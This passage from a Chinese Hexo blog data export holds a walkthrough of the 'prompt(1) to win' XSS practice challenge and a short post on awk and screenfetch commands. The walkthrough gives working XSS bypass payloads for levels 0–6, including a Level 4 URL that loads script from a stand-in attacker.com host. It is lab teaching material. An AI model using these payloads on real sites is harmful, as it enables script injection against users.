class=\"keyword\">return</span> form.outerHTML + <span class=\"string\">'                         \\n\\</span></span><br><span class=\"line\"><span class=\"string\">&lt;script&gt;                                                  \\n\\</span></span><br><span class=\"line\"><span class=\"string\">    // forbid javascript: or vbscript: and data: stuff    \\n\\</span></span><br><span class=\"line\"><span class=\"string\">    if (!/script:|data:/i.test(document.forms[0].action)) \\n\\</span></span><br><span class=\"line\"><span class=\"string\">        document.forms[0].submit();                       \\n\\</span></span><br><span class=\"line\"><span class=\"string\">    else                                                  \\n\\</span></span><br><span class=\"line\"><span class=\"string\">        document.write(\"Action forbidden.\")               \\n\\</span></span><br><span class=\"line\"><span class=\"string\">&lt;/script&gt;                                                 \\n\\</span></span><br><span class=\"line\"><span class=\"string\">        '</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (e) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">'Invalid form data.'</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>输入形如：<code>http://httpbin.org/post#{&quot;name&quot;:&quot;Matt&quot;}</code>格式的URL，会把<code>#</code>号前的部分作为新建表单的<code>action</code>属性的值，<code>#</code>号后面的Json格式的数据的键和值分别对应<code>&lt;input /&gt;</code>标签的<code>name</code>和<code>value</code>属性的值。</p>\n<p>正常情况下可以通过将<code>action</code>设置成<code>javascript</code>等伪协议，来触发XSS，但是过滤了<code>script:</code>、<code>data:</code>。</p>\n<p>这里涉及到的一个知识点就是JavaScript中<code>document.forms[0].action</code>表单DOM操作，会先选择表单中<code>name</code>属性值为<code>action</code>的输入框，如果找不到，才会选择<code>form</code>标签的<code>action</code>属性。</p>\n<p>因此Payload：</p>\n<blockquote>\n<ul>\n<li><code>javascript:prompt(1)#{&quot;action&quot;:&quot;111&quot;}</code></li>\n</ul>\n</blockquote>\n<p><code>document.forms[0].action</code>找到的不是<code>form</code>标签的<code>action</code>属性，而是<code>name</code>属性值为<code>action</code>的<code>&lt;input /&gt;</code>标签。</p>\n<p>……</p>\n<p><strong>参考链接</strong></p>\n<p><a href=\"https://www.cnblogs.com/Ashenone/p/9049341.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/Ashenone/p/9049341.html</a></p>\n<p><a href=\"https://blog.csdn.net/Ni9htMar3/article/details/77938899\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/Ni9htMar3/article/details/77938899</a></p>\n<p><a href=\"https://blog.csdn.net/qq_35078631/article/details/77073233\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/qq_35078631/article/details/77073233</a></p>\n","site":{"data":{}},"excerpt":"<h2 id=\"一、概述\"><a href=\"#一、概述\" class=\"headerlink\" title=\"一、概述\"></a>一、概述</h2><p><code>prompt(1) to win</code>是一个XSS挑战的靶场。</p>\n<p>靶场地址：<a href=\"http://prompt.ml/0\" target=\"_blank\" rel=\"noopener\">http://prompt.ml/0</a></p>\n<p>目标：Payload不需要用户交互，当输入有效且能执行<code>prompt(1)</code>向量时，会自动提交用户的答案。并显示<strong>YOU WON</strong>字样。</p>","more":"<h2 id=\"二、挑战\"><a href=\"#二、挑战\" class=\"headerlink\" title=\"二、挑战\"></a>二、挑战</h2><h3 id=\"Level-0\"><a href=\"#Level-0\" class=\"headerlink\" title=\"Level 0\"></a>Level 0</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">escape</span>(<span class=\"params\">input</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// warm up</span></span><br><span class=\"line\">    <span class=\"comment\">// script should be executed without user interaction</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">'&lt;input type=\"text\" value=\"'</span> + input + <span class=\"string\">'\"&gt;'</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>没有经过任何过滤就直接输出，直接考虑闭合即可。</p>\n<p>Payload:</p>\n<blockquote>\n<p><code>&quot;&gt;&lt;script&gt;prompt(1)&lt;/script&gt;</code></p>\n<p><code>&quot;&gt;&lt;img src=x onerror=prompt(1)&gt;</code></p>\n</blockquote>\n<h3 id=\"Level-1\"><a href=\"#Level-1\" class=\"headerlink\" title=\"Level 1\"></a>Level 1</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">escape</span>(<span class=\"params\">input</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// tags stripping mechanism from ExtJS library</span></span><br><span class=\"line\">    <span class=\"comment\">// Ext.util.Format.stripTags</span></span><br><span class=\"line\">    <span class=\"keyword\">var</span> stripTagsRE = <span class=\"regexp\">/&lt;\\/?[^&gt;]+&gt;/gi</span>;</span><br><span class=\"line\">    input = input.replace(stripTagsRE, <span class=\"string\">''</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">'&lt;article&gt;'</span> + input + <span class=\"string\">'&lt;/article&gt;'</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>JS正则：</p>\n<ul>\n<li>语法规则：<code>/正则表达式主体/修饰符(可选)`</code></li>\n<li><code></code>/&lt;\\/?[^&gt;]+&gt;/gi`：<ul>\n<li>匹配<code>&lt;除&gt;以外任意&gt;</code>或<code>&lt;/除&gt;以外任意&gt;`</code></li>\n<li><code></code>/gi`标识全局搜索匹配、不区分大小写。</li>\n</ul>\n</li>\n</ul>\n<p>将匹配的替换为空，因此不能出现<code>&lt;</code>和<code>&gt;</code>不能同时出现。由于一个标签即使没有最后面的<code>&gt;</code>也是可以被浏览器正确解析的。或者最后使用<code>//</code></p>\n<p>因此，Payload:</p>\n<blockquote>\n<p><code>&lt;img src=x onerror=prompt(1) //</code></p>\n<p><code>&lt;img src=x onerror=prompt(1)(空格)</code></p>\n</blockquote>\n<h3 id=\"Level-2\"><a href=\"#Level-2\" class=\"headerlink\" title=\"Level 2\"></a>Level 2</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">escape</span>(<span class=\"params\">input</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// v-- frowny face</span></span><br><span class=\"line\">    input = input.replace(<span class=\"regexp\">/[=(]/g</span>, <span class=\"string\">''</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// ok seriously, disallows equal signs and open parenthesis</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> input;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><code>[=(]</code>该正则含义为匹配<code>=</code>或<code>(</code>，因此这两个会被过滤。</p>\n<p>考虑使用字符实体来替代<code>=</code>和<code>(</code>绕过，他们对应的字符实体为：<code>&amp;#61;</code>、<code>&amp;#40;</code>。</p>\n<p>Payload：</p>\n<blockquote>\n<ul>\n<li><code>&lt;svg&gt;&lt;script&gt;prompt&amp;#40;1)&lt;/script&gt;</code></li>\n</ul>\n</blockquote>\n<p>这里有个问题，<code>script</code>标签是属于<strong><code>Raw text elements</code></strong>类型的，该类型的标签的内容是不会被HTML解析器解码的，为什么该Payload还可行？</p>\n<p>这是因为<code>&lt;svg&gt;</code>标签存在的缘故：</p>\n<p>SVG 是使用 XML 来描述二维图形和绘图程序的语言。</p>\n<p>简单来说就是处在<code>&lt;svg&gt;</code>标签内的内容会先被XML解析器解析，因此<code>&amp;#40;</code>会被解码为<code>(</code>。</p>\n<p>若支持ES6，还可以使用:</p>\n<blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; &lt;script&gt;eval.call`$&#123;'prompt\\x281)'&#125;\\`&lt;/script&gt;</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<p><code>eval</code>会对其进行解码。</p>\n<h3 id=\"Level-3\"><a href=\"#Level-3\" class=\"headerlink\" title=\"Level 3\"></a>Level 3</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">escape</span>(<span class=\"params\">input</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// filter potential comment end delimiters</span></span><br><span class=\"line\">    input = input.replace(<span class=\"regexp\">/-&gt;/g</span>, <span class=\"string\">'_'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// comment the input to avoid script execution</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">'&lt;!-- '</span> + input + <span class=\"string\">' --&gt;'</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>输入的内容会被输出到HTML注释之中，并且对<code>-&gt;</code>进行过滤，替换为<code>-</code>，以防对注释符号进行闭合。</p>\n<p>使用<code>--!&gt;</code>来闭合注释绕过。</p>\n<p>Payload:</p>\n<blockquote>\n<ul>\n<li><code>--!&gt;&lt;img src=x onerror=prompt(1)&gt;</code></li>\n</ul>\n</blockquote>\n<h3 id=\"Level-4\"><a href=\"#Level-4\" class=\"headerlink\" title=\"Level 4\"></a>Level 4</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">escape</span>(<span class=\"params\">input</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// make sure the script belongs to own site</span></span><br><span class=\"line\">    <span class=\"comment\">// sample script: http://prompt.ml/js/test.js</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"regexp\">/^(?:https?:)?\\/\\/prompt\\.ml\\//i</span>.test(<span class=\"built_in\">decodeURIComponent</span>(input))) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> script = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">'script'</span>);</span><br><span class=\"line\">        script.src = input;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> script.outerHTML;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">'Invalid resource.'</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>正则限制了只能加载当前域下的脚本，不允许跨域。</p>\n<p>但URL的格式可以形如：<code>http://user:password@attacker.com/</code>，表示以<code>user:password</code>登录<code>attack.com</code>。</p>\n<p>因此这里可以考虑使用Payload：<code>http://prompt.ml/@attacker.com/payload.js</code>。但浏览器只支持<code>http://prompt.ml@attacker.com/payload.js</code>这样的，但注意到存在<code>decodeURIComponent()</code>函数，该函数会进行URL解码，因此我们可以将<code>/</code>进行URL编码为<code>%2f</code>以绕过。</p>\n<p>最终Payload：</p>\n<blockquote>\n<ul>\n<li><code>http://prompt.ml%2f@attacker.com/payload.js</code></li>\n</ul>\n</blockquote>\n<p>该题需要我们<code>attacker.com</code>服务器上有payload.js文件，文件内容<code>prompt(1)</code>。</p>\n<h3 id=\"Level-5\"><a href=\"#Level-5\" class=\"headerlink\" title=\"Level 5\"></a>Level 5</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">escape</span>(<span class=\"params\">input</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// apply strict filter rules of level 0</span></span><br><span class=\"line\">    <span class=\"comment\">// filter \"&gt;\" and event handlers</span></span><br><span class=\"line\">    input = input.replace(<span class=\"regexp\">/&gt;|on.+?=|focus/gi</span>, <span class=\"string\">'_'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">'&lt;input value=\"'</span> + input + <span class=\"string\">'\" type=\"text\"&gt;'</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>过滤了<code>&gt;</code>和<code>on</code>事件句柄以及<code>focus</code>，会将它们替换为<code>_</code>。</p>\n<p>使用事件与等号可以不在一行特性进行绕过。并且使用<code>type=&quot;image&quot;</code>覆盖<code>type=&quot;text&quot;</code>。</p>\n<p>Payload：</p>\n<blockquote>\n<ul>\n<li><code>&quot; type=&quot;image&quot; src=x onerror\n=alert(1)</code></li>\n</ul>\n</blockquote>\n<h3 id=\"Level-6\"><a href=\"#Level-6\" class=\"headerlink\" title=\"Level 6\"></a>Level 6</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">escape</span>(<span class=\"params\">input</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// let's do a post redirection</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// pass in formURL#formDataJSON</span></span><br><span class=\"line\">        <span class=\"comment\">// e.g. http://httpbin.org/post#&#123;\"name\":\"Matt\"&#125;</span></span><br><span class=\"line\">        <span class=\"keyword\">var</span> segments = input.split(<span class=\"string\">'#'</span>);</span><br><span class=\"line\">        <span class=\"keyword\">var</span> formURL = segments[<span class=\"number\">0</span>];</span><br><span class=\"line\">        <span class=\"keyword\">var</span> formData = <span class=\"built_in\">JSON</span>.parse(segments[<span class=\"number\">1</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">var</span> form = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">'form'</span>);</span><br><span class=\"line\">        form.action = formURL;</span><br><span class=\"line\">        form.method = <span class=\"string\">'post'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i <span class=\"keyword\">in</span> formData) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">var</span> input = form.appendChild(<span class=\"built_in\">document</span>.createElement(<span class=\"string\">'input'</span>));</span><br><span class=\"line\">            input.name = i;</span><br><span class=\"line\">            input.setAttribute(<span class=\"string\">'value'</span>, formData[i]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> form.outerHTML + <span class=\"string\">'                         \\n\\</span></span><br><span class=\"line\"><span class=\"string\">&lt;script&gt;                                                  \\n\\</span></span><br><span class=\"line\"><span class=\"string\">    // forbid javascript: or vbscript: and data: stuff    \\n\\</span></span><br><span class=\"line\"><span class=\"string\">    if (!/script:|data:/i.test(document.forms[0].action)) \\n\\</span></span><br><span class=\"line\"><span class=\"string\">        document.forms[0].submit();                       \\n\\</span></span><br><span class=\"line\"><span class=\"string\">    else                                                  \\n\\</span></span><br><span class=\"line\"><span class=\"string\">        document.write(\"Action forbidden.\")               \\n\\</span></span><br><span class=\"line\"><span class=\"string\">&lt;/script&gt;                                                 \\n\\</span></span><br><span class=\"line\"><span class=\"string\">        '</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (e) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">'Invalid form data.'</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>输入形如：<code>http://httpbin.org/post#{&quot;name&quot;:&quot;Matt&quot;}</code>格式的URL，会把<code>#</code>号前的部分作为新建表单的<code>action</code>属性的值，<code>#</code>号后面的Json格式的数据的键和值分别对应<code>&lt;input /&gt;</code>标签的<code>name</code>和<code>value</code>属性的值。</p>\n<p>正常情况下可以通过将<code>action</code>设置成<code>javascript</code>等伪协议，来触发XSS，但是过滤了<code>script:</code>、<code>data:</code>。</p>\n<p>这里涉及到的一个知识点就是JavaScript中<code>document.forms[0].action</code>表单DOM操作，会先选择表单中<code>name</code>属性值为<code>action</code>的输入框，如果找不到，才会选择<code>form</code>标签的<code>action</code>属性。</p>\n<p>因此Payload：</p>\n<blockquote>\n<ul>\n<li><code>javascript:prompt(1)#{&quot;action&quot;:&quot;111&quot;}</code></li>\n</ul>\n</blockquote>\n<p><code>document.forms[0].action</code>找到的不是<code>form</code>标签的<code>action</code>属性，而是<code>name</code>属性值为<code>action</code>的<code>&lt;input /&gt;</code>标签。</p>\n<p>……</p>\n<p><strong>参考链接</strong></p>\n<p><a href=\"https://www.cnblogs.com/Ashenone/p/9049341.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/Ashenone/p/9049341.html</a></p>\n<p><a href=\"https://blog.csdn.net/Ni9htMar3/article/details/77938899\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/Ni9htMar3/article/details/77938899</a></p>\n<p><a href=\"https://blog.csdn.net/qq_35078631/article/details/77073233\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/qq_35078631/article/details/77073233</a></p>"},{"title":"Amazing Command -Linux篇","date":"2019-03-22T06:24:08.000Z","_content":"\n### 前面的话\n\n记录一些自己觉得有用或有趣的Linux命令的用法，持续更新......\n\n直接记录命令的某种用法，具体用法使用命令的`-h`的选项查看。\n\n<!-- more -->\n\n### 0x00 awk\n\n> awk默认的行为是从标准输入中逐行（即每次读取直到遇到换行符`\\n`停止）读入数据，并以空格为默认分隔符将读取的每行数据切片，`$0`指代整行数据，`$1`指代切片得到的第一部分，`$2`指代切片得到的第二部分，以此类推,`$n`指代切片得到的第n部分。\n\n**awk + action**：对awk的默认行为得到的数据直接进行action。\n\n- 格式：`awk '{action}'`\n- last -n 2 | awk '{print $0}' \n\n```\nnick     :0           :0               Fri Mar 29 10:08   still logged in\nreboot   system boot  4.18.0-16-generi Fri Mar 29 10:07   still running\n```\n\n- last -n 2 | awk '{print $1}' \n\n```\nnick  \nreboot  \n```\n\n**awk + pattern + action**：对读取的每行先使用pattern正则去匹配，满足正则的才进行awk的默认行为，然后进行action。\n\n- 格式：`awk '/pattern/{action}'`\n- last -n 4 | awk '/nick/{print $0}'\n\n```\nnick     :0           :0               Fri Mar 29 10:08   still logged in\nnick     :0           :0               Thu Mar 28 10:48 - 17:16  (06:27)\n```\n\n- last -n 4 | awk '/^nick/'\n\n```\nreboot   system boot  4.18.0-16-generi Fri Mar 29 10:07   still running\nreboot   system boot  4.18.0-16-generi Thu Mar 28 10:47 - 17:16  (06:28)\n```\n\n`-F` 用于指定分割符，默认是空格。printf()用来格式化输出。\n\n- cat /etc/passwd | awk -F ':' '/root/{printf(\"%s,%s\",$1,$7)}'\n\n```\nroot,/bin/zsh% \n```\n\n### 0x01 screenfetch\n\n> 用于显示系统基本信息及其banner。\n\n- 直接`screenfetch`会显示系统基本信息及其对应的ASCII字符banner。\n- `screenfetch -A 'OS_name'`：显示系统基本信息及指定系统的ASCII字符banner。\n\n```\n#用于你可能是ubuntu，但是却希望打印的图标是Mac或其他\nscreenfetch -A 'Mac OS X'\nscreenfetch -A 'Kali Linux'\n```\n\n- `screenfetch -s`：屏幕快照，即截屏。\n\n","source":"_posts/Amazing-Command-Linux.md","raw":"---\ntitle: Amazing Command -Linux篇\ndate: 2019-03-22 14:24:08\ntags: \n\t- Linux\ncategories: Misc\n---\n\n### 前面的话\n\n记录一些自己觉得有用或有趣的Linux命令的用法，持续更新......\n\n直接记录命令的某种用法，具体用法使用命令的`-h`的选项查看。\n\n<!-- more -->\n\n### 0x00 awk\n\n> awk默认的行为是从标准输入中逐行（即每次读取直到遇到换行符`\\n`停止）读入数据，并以空格为默认分隔符将读取的每行数据切片，`$0`指代整行数据，`$1`指代切片得到的第一部分，`$2`指代切片得到的第二部分，以此类推,`$n`指代切片得到的第n部分。\n\n**awk + action**：对awk的默认行为得到的数据直接进行action。\n\n- 格式：`awk '{action}'`\n- last -n 2 | awk '{print $0}' \n\n```\nnick     :0           :0               Fri Mar 29 10:08   still logged in\nreboot   system boot  4.18.0-16-generi Fri Mar 29 10:07   still running\n```\n\n- last -n 2 | awk '{print $1}' \n\n```\nnick  \nreboot  \n```\n\n**awk + pattern + action**：对读取的每行先使用pattern正则去匹配，满足正则的才进行awk的默认行为，然后进行action。\n\n- 格式：`awk '/pattern/{action}'`\n- last -n 4 | awk '/nick/{print $0}'\n\n```\nnick     :0           :0               Fri Mar 29 10:08   still logged in\nnick     :0           :0               Thu Mar 28 10:48 - 17:16  (06:27)\n```\n\n- last -n 4 | awk '/^nick/'\n\n```\nreboot   system boot  4.18.0-16-generi Fri Mar 29 10:07   still running\nreboot   system boot  4.18.0-16-generi Thu Mar 28 10:47 - 17:16  (06:28)\n```\n\n`-F` 用于指定分割符，默认是空格。printf()用来格式化输出。\n\n- cat /etc/passwd | awk -F ':' '/root/{printf(\"%s,%s\",$1,$7)}'\n\n```\nroot,/bin/zsh% \n```\n\n### 0x01 screenfetch\n\n> 用于显示系统基本信息及其banner。\n\n- 直接`screenfetch`会显示系统基本信息及其对应的ASCII字符banner。\n- `screenfetch -A 'OS_name'`：显示系统基本信息及指定系统的ASCII字符banner。\n\n```\n#用于你可能是ubuntu，但是却希望打印的图标是Mac或其他\nscreenfetch -A 'Mac OS X'\nscreenfetch -A 'Kali Linux'\n```\n\n- `screenfetch -s`：屏幕快照，即截屏。\n\n","slug":"Amazing-Command-Linux","published":1,"updated":"2019-03-29T06:57:06.280Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjuam83kl001t7or0cs7qx41p","content":"<h3 id=\"前面的话\"><a href=\"#前面的话\" class=\"headerlink\" title=\"前面的话\"></a>前面的话</h3><p>记录一些自己觉得有用或有趣的Linux命令的用法，持续更新……</p>\n<p>直接记录命令的某种用法，具体用法使用命令的<code>-h</code>的选项查看。</p>\n<a id=\"more\"></a>\n<h3 id=\"0x00-awk\"><a href=\"#0x00-awk\" class=\"headerlink\" title=\"0x00 awk\"></a>0x00 awk</h3><blockquote>\n<p>awk默认的行为是从标准输入中逐行（即每次读取直到遇到换行符<code>\\n</code>停止）读入数据，并以空格为默认分隔符将读取的每行数据切片，<code>$0</code>指代整行数据，<code>$1</code>指代切片得到的第一部分，<code>$2</code>指代切片得到的第二部分，以此类推,<code>$n</code>指代切片得到的第n部分。</p>\n</blockquote>\n<p><strong>awk + action</strong>：对awk的默认行为得到的数据直接进行action。</p>\n<ul>\n<li>格式：<code>awk &#39;{action}&#39;</code></li>\n<li>last -n 2 | awk ‘{print $0}’ </li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nick     :0           :0               Fri Mar 29 10:08   still logged in</span><br><span class=\"line\">reboot   system boot  4.18.0-16-generi Fri Mar 29 10:07   still running</span><br></pre></td></tr></table></figure>\n<ul>\n<li>last -n 2 | awk ‘{print $1}’ </li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nick  </span><br><span class=\"line\">reboot</span><br></pre></td></tr></table></figure>\n<p><strong>awk + pattern + action</strong>：对读取的每行先使用pattern正则去匹配，满足正则的才进行awk的默认行为，然后进行action。</p>\n<ul>\n<li>格式：<code>awk &#39;/pattern/{action}&#39;</code></li>\n<li>last -n 4 | awk ‘/nick/{print $0}’</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nick     :0           :0               Fri Mar 29 10:08   still logged in</span><br><span class=\"line\">nick     :0           :0               Thu Mar 28 10:48 - 17:16  (06:27)</span><br></pre></td></tr></table></figure>\n<ul>\n<li>last -n 4 | awk ‘/^nick/‘</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">reboot   system boot  4.18.0-16-generi Fri Mar 29 10:07   still running</span><br><span class=\"line\">reboot   system boot  4.18.0-16-generi Thu Mar 28 10:47 - 17:16  (06:28)</span><br></pre></td></tr></table></figure>\n<p><code>-F</code> 用于指定分割符，默认是空格。printf()用来格式化输出。</p>\n<ul>\n<li>cat /etc/passwd | awk -F ‘:’ ‘/root/{printf(“%s,%s”,$1,$7)}’</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root,/bin/zsh%</span><br></pre></td></tr></table></figure>\n<h3 id=\"0x01-screenfetch\"><a href=\"#0x01-screenfetch\" class=\"headerlink\" title=\"0x01 screenfetch\"></a>0x01 screenfetch</h3><blockquote>\n<p>用于显示系统基本信息及其banner。</p>\n</blockquote>\n<ul>\n<li>直接<code>screenfetch</code>会显示系统基本信息及其对应的ASCII字符banner。</li>\n<li><code>screenfetch -A &#39;OS_name&#39;</code>：显示系统基本信息及指定系统的ASCII字符banner。</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#用于你可能是ubuntu，但是却希望打印的图标是Mac或其他</span><br><span class=\"line\">screenfetch -A &apos;Mac OS X&apos;</span><br><span class=\"line\">screenfetch -A &apos;Kali Linux&apos;</span><br></pre></td></tr></table></figure>\n<ul>\n<li><code>screenfetch -s</code>：屏幕快照，即截屏。</li>\n</ul>\n","site":{"data":{}},"excerpt":"<h3 id=\"前面的话\"><a href=\"#前面的话\" class=\"headerlink\" title=\"前面的话\"></a>前面的话</h3><p>记录一些自己觉得有用或有趣的Linux命令的用法，持续更新……</p>\n<p>直接记录命令的某种用法，具体用法使用命令的<code>-h</code>的选项查看。</p>","more":"<h3 id=\"0x00-awk\"><a href=\"#0x00-awk\" class=\"headerlink\" title=\"0x00 awk\"></a>0x00 awk</h3><blockquote>\n<p>awk默认的行为是从标准输入中逐行（即每次读取直到遇到换行符<code>\\n</code>停止）读入数据，并以空格为默认分隔符将读取的每行数据切片，<code>$0</code>指代整行数据，<code>$1</code>指代切片得到的第一部分，<code>$2</code>指代切片得到的第二部分，以此类推,<code>$n</code>指代切片得到的第n部分。</p>\n</blockquote>\n<p><strong>awk + action</strong>：对awk的默认行为得到的数据直接进行action。</p>\n<ul>\n<li>格式：<code>awk &#39;{action}&#39;</code></li>\n<li>last -n 2 | awk ‘{print $0}’ </li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nick     :0           :0               Fri Mar 29 10:08   still logged in</span><br><span class=\"line\">reboot   system boot  4.18.0-16-generi Fri Mar 29 10:07   still running</span><br></pre></td></tr></table></figure>\n<ul>\n<li>last -n 2 | awk ‘{print $1}’ </li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nick  </span><br><span 